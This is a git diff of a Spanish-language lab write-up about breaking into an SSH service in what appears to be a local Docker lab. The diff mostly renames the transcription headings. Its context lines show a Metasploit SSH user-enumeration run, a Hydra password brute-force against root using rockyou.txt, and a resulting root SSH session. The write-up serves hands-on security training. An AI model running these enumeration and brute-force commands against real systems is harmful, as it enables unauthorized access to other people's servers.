@@ -33,13 +33,13 @@ msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /ruta/a/rockyou.txt   #
 msf auxiliary(scanner/ssh/ssh_enumusers) > run
 ```
 
-> Nota importante: Las capturas de pantalla proporcionadas muestran salidas con la IP `172.17.0.2`. A continuación transcribo el texto exacto de cada imagen para evitar confusiones — las transcripciones se muestran como texto literal y están claramente separadas del resto del writeup.
+> Nota importante: Las capturas de pantalla proporcionadas muestran salidas con la IP `172.17.0.2`. A continuación transcribo el texto exacto de las salidas para evitar confusiones — las transcripciones se muestran como texto literal y están claramente separadas del resto del writeup.
 
 ---
 
-## Transcripciones de las capturas (texto literal)
+## Transcripciones (texto literal)
 
-### Captura 1 — Transcripción (ssh_enumusers, ejemplo)
+### (ssh_enumusers)
 
 ```
 msf auxiliary(scanner/ssh/ssh_enumusers) > run
@@ -72,7 +72,7 @@ msf auxiliary(scanner/ssh/ssh_enumusers) >
 
 ---
 
-### Captura 2 — Transcripción (duplicado/otro momento)
+### (ssh_enumusers) — ejecución repetida
 
 ```
 msf auxiliary(scanner/ssh/ssh_enumusers) > run
@@ -105,7 +105,7 @@ msf auxiliary(scanner/ssh/ssh_enumusers) >
 
 ---
 
-### Captura 3 — Transcripción (Hydra)
+### (Hydra)
 
 ```
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
@@ -118,7 +118,7 @@ Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
 
 ---
 
-### Captura 4 — Transcripción (sesión SSH como root)
+### (SSH — sesión como root)
 
 ```
 ssh root@172.17.0.2
@@ -188,4 +188,4 @@ Este ejercicio se realizó con fines educativos y en un entorno controlado. No e
 
 ## Archivos relacionados 📁
 - Writeup: `laboratorios/BreakMySSH/breakmyssh.md`
-- (Antes había imágenes; las capturas fueron transcritas arriba para evitar confusiones.)
+- (Antes había imágenes; las salidas fueron transcritas arriba para evitar confusiones.)
